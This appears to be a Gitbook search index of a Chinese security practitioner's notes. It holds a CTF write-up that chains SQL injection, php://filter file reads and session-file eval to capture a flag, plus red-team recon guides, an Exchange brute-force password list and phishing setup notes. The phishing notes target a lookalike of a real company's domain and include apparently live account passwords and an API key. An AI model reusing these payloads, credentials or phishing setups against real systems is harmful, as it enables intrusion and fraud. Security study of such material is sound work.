{"./":{"url":"./","title":"Introduction","keywords":"","body":"1. Introduction 个人的技能树，希望积累下来，保持更新 2. 关于我 Github: https://github.com/R1card0-tutu Blog: https://r1card0-tutu.github.io/ 3. 待续 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 15:10:51 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"CTF/2022年海事局比赛/WEB/ezlogin.html":{"url":"CTF/2022年海事局比赛/WEB/ezlogin.html","title":"Ezlogin","keywords":"","body":"0x01 登录框注入 sqlmap一把梭 POST /verification.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: PHPSESSID=86bjgupkc5k81qjanefmq3q7c6; user_pref=%2F Connection: close username=admin'+AND+(SELECT+7013+FROM+(SELECT(SLEEP(5)))tjwJ)--+CtWG&password=123456 sqlmap -r web.txt --batch --random-agent -v 3 --level 3 --risk 3 --threads 5 -D ctf_cl -T admin_user -C \"id,username,pass,email\" --dump 0x02 后台文件读取 POST /bigcarhome.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 70 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=php://filter/read=convert.base64-encode/resource=bigcarhome.php bigcarhome.php源码 ?????文件管理🌟欢迎回来!???????后台文件管理系统?退出????Home!?欢迎回来!!! -->??? ?? ?? ?Search? ????\";?echo \"\";?}?include($page);??>?????????????????????小汽车🚗开起来，嘟嘟嘟嘟～～～～～～～??? search输入值会被文件包含 读取verification.php源码 POST /bigcarhome.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 72 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=php://filter/read=convert.base64-encode/resource=verification.php 源码 alert('hackè¡ä¸º')\"); } return $var; } session_start(); $DATABASE_HOST = '127.0.0.1'; $DATABASE_USER = 'root'; $DATABASE_PASS = 'root'; $DATABASE_NAME = 'ctf_cl'; $con = mysqli_connect($DATABASE_HOST, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME); if ( mysqli_connect_errno() ) { die ('Failed to connect to MySQL: ' . mysqli_connect_error()); } if ( !isset($_POST['username'], $_POST['password']) ) { header('Location: home.php'); } $uname = waf($_POST['username']); $passwd = waf($_POST['password']); $smt=\"SELECT * FROM admin_user WHERE username='$uname' and pass='$passwd'\"; $result=mysqli_query($con,$smt); $row = mysqli_fetch_array($result,MYSQLI_NUM); if ($row) { session_regenerate_id(); $_SESSION['loggedin'] = TRUE; $_SESSION['name'] = $_POST['username']; $_SESSION['id'] = $id; setcookie('user_pref','/',time() + (86400 * 30), \"/\"); header('Location: bigcarhome.php'); } elseif ($_POST['password'] == \"admin\") { echo \"Password or username is not correct.\"; header('Location: login.php'); }else { echo \"Password or username is not correct.\"; header('Location: login.php'); } ?> 登录成功username会写入session，写入到/tmp目录下，读取index.php源码发现phpinfo，发现disablefunction里面没禁用eval与scandir index.php源码 13) { die(\"$c too long\"); } if ( preg_match('/[a-z0-9]||\\\\?|\\\\[|\\\\]|\\\\*|@|\\\\||\\\\^|~|&|\\s/i', $cmd) ) { die(\"nonono\"); } eval( \"print($cmd);\" ); } else { exit(); } 写入eval到session文件 POST /verification.php HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 69 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close username=&password=admin'%20||%201=1--%201 列目录读取根目录flag文件名 POST /bigcarhome.php?a=var_dump(scandir('/')); HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 43 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43 读取flag值 POST /bigcarhome.php?a=var_dump(file_get_contents('/ohhhyoufindflag')); HTTP/1.1 Host: 39.104.50.15:33277 Content-Length: 43 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://39.104.50.15:33277 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://39.104.50.15:33277/bigcarhome.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=e4fl469gljdinq86049t799k0u; user_pref=%2F Connection: close search=/tmp/sess_tl3hqon8u43nt22gchhmf4ja43 Tips 前台注入 万能密码绕过or || session文件包含 php7 session文件默认目录猜测 scandir函数列目录 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-30 14:07:16 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/01.Java代码审计/":{"url":"代码审计/01.Java代码审计/","title":"01.Java代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/02.PHP代码审计/":{"url":"代码审计/02.PHP代码审计/","title":"02.PHP代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"代码审计/03.Golang代码审计/":{"url":"代码审计/03.Golang代码审计/","title":"03.Golang代码审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/01.合约审计/":{"url":"区块链安全/01.合约审计/","title":"01.合约审计","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/02.漏洞分析/":{"url":"区块链安全/02.漏洞分析/","title":"02.漏洞分析","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"区块链安全/03.金融知识/":{"url":"区块链安全/03.金融知识/","title":"03.金融知识","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/00.隐藏自己/":{"url":"红蓝对抗/01.打点/00.隐藏自己/","title":"00.隐藏自己","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/":{"url":"红蓝对抗/01.打点/01.信息收集/","title":"01.信息收集","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/2.根域名收集/01.根域名资产收集（一）.html":{"url":"红蓝对抗/01.打点/01.信息收集/2.根域名收集/01.根域名资产收集（一）.html","title":"01.根域名资产收集（一）","keywords":"","body":"通常情况下本脚本小子拿到的授权书要不是公司名字要不是一个主域名，那么可以通过下面的技巧扩展外网的根域名暴露面，提高接入目标内网的概率。 0x01. 利用ICP备案信息进行收集 在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经备案，不得在中华人民共和国境内从事经营性互联网信息服务。目前只要是企业在中国境内需要提供互联网服务，都必须通过ICP工商备案才能运行。（未备案的或者在备案路上的后面再讲）我们可以通过 信息备案管理系统 进行查询。 输入框支持反向查询。ICP备案查询：请输入单位名称或域名或备案号查询，请勿使用子域名或者带http://www等字符的网址查询 0x02.工商股权信息收集 从暴露面风险上来说企业在被收购或者控股后在IT架构上也会接入集团的IT网络中，相关的业务也会有比较紧密的合作，所有一旦子公司存在比较严重的安全风险，攻击者可将子公司的网络作为跳板进一步的公司集团核心业务系统。获取到子公司的名称后我们再通过利用ICP备案信息进行收集中的ICP备案信息查询获取到公司备案的其他根域名信息。 目前国内所有的企业，无论是私营企业还是国有企业都需要进行工商登记后才能进行企业正常运营。可以通过 国家企业信用信息公示系统 查询指定企业的工商注册信息。以及通过商业公司：天眼查、企查查、爱企查、小蓝本、钉钉企典、EnScan等平台查询到目标企业旗下其他业务的子公司名称，通过子公司的ICP备案信息再进一步扩展其他的根域名数据。 一般来说我们定义控股或者并购关系的公司一般都属于目标企业的所属集团，当然有些并购可能不对外公式，我们可以关注一些投融资的新闻来获取这部分讯息。 0x03. Whois数据信息收集 前面两步我们已经获取到企业在境内备案的根域名数据，但是在实际的入侵过程中往往会遇到企业分公司未经审计私开业务、企业非备案的境外业务等情况。每个域名的注册都必须对外公开Whois数据，但是现在很多域名商默认都会开启域名隐私保护，需要借助一些数据平台查询域名历史的Whois信息来进行关联。通过Whois网站 查询 利用ICP备案信息进行收集到的根域名 工商股权信息收集收集到的根域名 查询历史注册者和注册邮箱，扩展更多的关联资产。 0x04. SSL证书扩展 前面的步骤目前收集到大量的根域名信息，但是还是有一些域名它没有工商备案信息，域名也是新注册的开启了隐私保护从Whois历史数据中也没办法找到关联方法。可以借助资产探测平台来寻找一些域名关联的特征。企业在申请证书的时候一般会将同类业务域名的申请成一张成熟，一方面是出于成本考虑，还有一方面也是方面对证书进行同一的管理。 cert=\"\" 在证书里面发现的其他与目标强相关的关键词也可以再次查询。 0x05. DNS解析数据关联 一般大型的企业会自建DNS服务器用于业务域名的解析，一般情况只会对自有业务提供DNS解析服务。 nslookup -type=ns domain dig -t ns domain 将查询到的ns域名作为key，通过公开的DNS解析数据集rapid7 DNS 搭建DNSDB或者使用公开的数据集合 https://hackertarget.com/find-shared-dns-servers/ https://github.com/spyse-com/go-spyse 反向查询ns服务器对应的根域名数据。查询到的数据需要进行进一步的筛选和验证。 0x06. Web配置信息关联 响应头的CSP中定义允许跨域资源加载的白名单地址 Set-Cookie中定义Cookie适用的可用域范围 Set-Cookie的特殊标记 Server自定义业务名称 自定义的ICON图标（mmh3 hash） ICP备案号 在线的运营工具(百度统计、53客服、扫描登录等) 百度统计的hash 美洽客服 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:21:02 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/2.根域名收集/02.根域名资产收集（二）.html":{"url":"红蓝对抗/01.打点/01.信息收集/2.根域名收集/02.根域名资产收集（二）.html","title":"02.根域名资产收集（二）","keywords":"","body":"https://zone.huoxian.cn/d/553-101 红蓝对抗之企业对外根域名资产收集 https://zone.huoxian.cn/d/257 企业根域名资产收集细节再补充 https://zone.huoxian.cn/d/103 信息收集系列之子域名发现 https://zone.huoxian.cn/d/275 信息收集系列之善用搜索引擎 https://zone.huoxian.cn/d/285 信息收集系列之domain_hunter_pro使用 https://zone.huoxian.cn/d/316-domain-hunter-pro 信息收集系列之JavaScript文件敏感信息提取 https://zone.huoxian.cn/d/336-javascript 信息收集系列之指纹识别 https://zone.huoxian.cn/d/372 信息收集系列之自动化工具ShuiZe_0x727 https://zone.huoxian.cn/d/396-shuize-0x727 信息收集系列之网站快照 https://zone.huoxian.cn/d/461 信息收集系列之资产风险监测系统Biu https://zone.huoxian.cn/d/514-biu 信息收集之“骚”姿势 @鱼七 https://zone.huoxian.cn/d/618 0x01 通过PTR记录收集 PTR记录，是电子邮件系统中的邮件交换记录的一种；另一种邮件交换记录是A记录（在IPv4协议中）或AAAA记录（在IPv6协议中）。PTR记录常被用于反向地址解析。尽可能多的收集目标的IP地址，然后通过PTR记录反向查询域名 1.收集IP段 https://bgp.he.net/search?search%5Bsearch%5D=tesla&commit=Search 2.正则提取IP段 (\\d{1,3}\\.){3}\\d{1,3}\\/\\d{1,2} 3.解析PTR记录 cat tesla.txt | mapcidr -silent | dnsx -silent -ptr -resp-only -o output.txt 4.提取根域名 cat ~/Desktop/output.txt | python extract-root-domain.py - 提取脚本 import click from wsltools.domaintools import domain def generate(results): for result in results: if domain(result).valid: yield domain(result).main @click.command() @click.argument('filename', required=True, type=click.File(mode='r')) def main(filename): results = filename.read().splitlines() for r in set(generate(results)): click.echo(r) if __name__ == \"__main__\": main() 0x03 WHOIS反查接口推荐 https://drs.whoisxmlapi.com/reverse-whois-search 0x04 SSL证书扩展补充 除了通过fofa、shodan、zoomeye、quake等空间描绘搜索引擎，还可以通过http://tls.bufferover.run/收集 curl 'https://tls.bufferover.run/dns?q=.goodrv.com' -H 'x-api-key: AOQAtcfMK02TFg5BwMIJH4b621XQpBNCap8j0GPc' 通过ip获取tls证书 echo 'https://183.201.217.110/' | httpx -json -silent | jq 0x05 Hackerone 一些在hackerone上进行众测的厂商，会把自己的测试范围列举出来，其中就包含有大量的域名，因此通过hackerone来完善资产收集也是一个不错的方法。 https://hackerone.com/alibaba?type=team&view_policy=true 0x05 Google Google直接搜索里面的一些关键内容来查询，比如公司名、备案、引用的特殊js等 intext:浙ICP备09002987号 intext:33010002000070 -www Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:52:07 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/01.子域名资产收集（一）.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/01.子域名资产收集（一）.html","title":"01.子域名资产收集（一）","keywords":"","body":"0x01 子域名收集流程 0x02 通过第三方数据源收集 比较有名有VirusTotal、微步、SecurityTrails、Spyse、Censys等。 参考：https://gist.github.com/sidxparab/22c54fd0b64492b6ae3224db8c706228 0x03 子域名爆破 字典：https://raw.githubusercontent.com/joinsec/BadDNS/master/domaindict-170W.txt 优质的DNS服务ip：https://raw.githubusercontent.com/bp0lr/dmut-resolvers/main/resolvers.txt 爆破工具：https://github.com/d3mondev/puredns 安装部署 go环境 wget https://go.dev/dl/go1.17.11.linux-amd64.tar.gz tar -C /usr/local -xzf go1.17.11.linux-amd64.tar.gz export PATH=$PATH:/usr/local/go/bin （添加到/etc/profile） source /etc/profile massdns环境 git clone https://github.com/blechschmidt/massdns.git cd massdns make sudo make install 安装puredns go env -w GOPROXY=https://goproxy.cn go install github.com/d3mondev/puredns/v2@latest git clone https://github.com/d3mondev/puredns.git make 运行常用命令 puredns bruteforce ./domaindict-170W.txt domain.com --resolvers resolvers.txt 0x04 排列组合 在我们渗透过程中，总是会发现一些子域名带有以下关键词 admin alpha api backend beta dev intra prod staging staging test uat 以sso.huoxian.cn举例子，可能会有如下命名方式的子域名 sso-test.huoxian.cn sso.test.huoxian.cn ssotest.huoxian.cn testsso.huoxian.cn 我们可以通过dnsgen这款工具生成子域名列表，再进行解析，来扩大攻击面。 echo 'sso.huoxian.cn' | dnsgen -w alt.txt - Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:21:24 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/02.DNS域传送.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/02.DNS域传送.html","title":"02.DNS域传送","keywords":"","body":"0x01 DNS域传送漏洞简介 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。 0x02 检测方法 nslookup # 查询nameserver nslookup -type=ns knownsec.com 119.29.29.29 # 指定nameserver，列举域名信息 nslookup server dns29.hichina.com ls knownsec.com dig axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 # 找到NS服务器 dig knownsec.com ns # 发送axfr请求 dig axfr @f1g1ns2.dnspod.net knownsec.com nmap nmap的脚本dns-zone-transfer可以帮我们探测是否存在域传送漏洞 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=knownsec.com -p 53 -Pn f1g1ns1.dnspod.net Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:46:42 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/03.domain_hunter_pro使用.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/03.domain_hunter_pro使用.html","title":"03.domain_hunter_pro使用","keywords":"","body":"0x01 前言 domain_hunter_pro是bit4woo开发的一款burp插件，方便快捷的目标管理、自动化的信息收集、与burp无缝衔接、与外部安全工具联动 https://github.com/bit4woo/domain_hunter_pro 0x02 以特斯拉为例 先从https://bugcrowd.com/tesla获取相关根域名。 0x03 OneForAll一把梭 python3 oneforall.py --target tesla.cn run 0x04 数据导入到domain_hunter_pro Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-30 10:16:14 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/02.WEB漏洞/":{"url":"红蓝对抗/01.打点/02.WEB漏洞/","title":"02.WEB漏洞","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/02.WEB漏洞/Exchange/exchange爆破.html":{"url":"红蓝对抗/01.打点/02.WEB漏洞/Exchange/exchange爆破.html","title":"exchange爆破","keywords":"","body":"0x01 Exchange爆破 项目中碰到exchange除了漏洞利用还可以进行爆破，每半个小时可以爆破三次 0x02 常用口令 1qaz@WSX 目标域名@年份 目标域名#年份 Passw@rd Passw0rd1 P@ssw0rd 0x03爆破工具 https://www.anquanke.com/post/id/226543#h3-6 https://github.com/grayddq/EBurst 带客人yyds Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-05 14:54:49 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/03.APP渗透相关/":{"url":"红蓝对抗/01.打点/03.APP渗透相关/","title":"03.APP渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/04.小程序渗透相关/":{"url":"红蓝对抗/01.打点/04.小程序渗透相关/","title":"04.小程序渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/05.钓鱼相关/":{"url":"红蓝对抗/01.打点/05.钓鱼相关/","title":"05.钓鱼相关","keywords":"","body":"钓鱼红队基础设施搭建 1、CS搭建、隐藏、CDN、养域名....2、鱼叉钓鱼：邮箱信息收集3、水坑钓鱼：XSS挖掘、JS模板4、IM钓鱼：话术准备 5、网页克隆钓鱼：一键化工具测试 6、免杀样本准备： CVE-2022-30190 CVE-2018-4878 CVE-2017-11882 CVE-2022-0337 lnk样本 7、工具免杀准备 fscan等内网扫描工具 frp等隧道代理工具 mimikatz等内网横向工具 钓鱼工具推荐 https://github.com/gophish/gophish：可以克隆网页，编写钓鱼邮件，还可以 导入模板，能追踪受害者的状态，如是否点击和输入内容，以及后续的cookie。 https://github.com/Raikia/FiercePhish：制作钓鱼邮件、编写模板，能快速 导入导出。 https://github.com/GemGeorge/SniperPhish：制作钓鱼网站和钓鱼网页，追 踪受害者动态、支持嵌入二维码，自动重命名附件，是个非常强大的工具，五星好评 https://github.com/makdosx/mip22：多达69个模板，自动缩短钓鱼url，自动 内网穿透。 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 10:40:00 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/05.钓鱼相关/邮箱钓鱼/邮箱钓鱼.html":{"url":"红蓝对抗/01.打点/05.钓鱼相关/邮箱钓鱼/邮箱钓鱼.html","title":"邮箱钓鱼","keywords":"","body":"邮件钓鱼 同形异义 https://github.com/urbanadventurer/urlcrazy 代注册域名 citiic.com 目标邮件服务器 https://mail.citic.com/ ewomail http://43.129.91.15:8001/ admin 0fFRzMBDJn95Kg 腾讯云需要解封25端口 omoqv953@yeah.net wwwyunyun@@2020 gofish配置过程 启动 docker pull gophish/gophish docker run -it -d --rm --name gophish -p 3333:3333 -p 8003:80 -p 8004:8080 gophish/gophish 读取密码 docker logs gophish 配置smtp服务器 添加header 钓鱼连接需要手动适配 参考 钓鱼邮件模板：https://github.com/SimplySecurity/SimplyTemplate 钓鱼邮件模板：https://github.com/criggs626/PhishingTemplates 钓鱼邮件工具：https://github.com/xHak9x/SocialPhish 如何伪造一封合格的钓鱼邮件：https://blog.csdn.net/yiifaa/article/details/78471241 记一次真实的邮件钓鱼演练：https://xz.aliyun.com/t/5412 